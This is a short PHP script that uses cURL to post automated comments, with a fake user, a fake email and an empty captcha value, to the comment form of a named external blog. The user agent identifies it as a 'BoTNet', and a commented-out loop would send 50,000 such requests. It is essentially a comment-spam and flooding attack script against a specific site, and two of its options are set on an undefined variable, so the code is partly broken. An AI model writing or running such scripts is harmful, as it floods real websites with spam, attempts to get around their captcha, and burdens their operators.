<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$myvars = 'uname=' . "arl" . '&email=' . "doesntmatter@hmtl.comas" . "&postid=" . "7" . "&comment=" . "hellow" . "&captcha=" . "\"\"";
//ob_end_clean();
//header("Connection: close\r\n");
//header("Content-Encoding: none\r\n");
//header("Content-Length: 1");
//ignore_user_abort(true);
$url = 'http://www.aritzcracker.ca/blog_comment.php';
$ch = curl_init( $url );
curl_setopt($ch,CURLOPT_USERAGENT,'ArL BoTNet. P.S - You Smell.');
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $myvars);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
//curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_TIMEOUT_MS, 1);
 curl_setopt($curl, CURLOPT_NOSIGNAL, 1);
//for($a = 0; $a < 50000; $a++){
$resp = curl_exec( $ch );
echo($resp);
//}


?>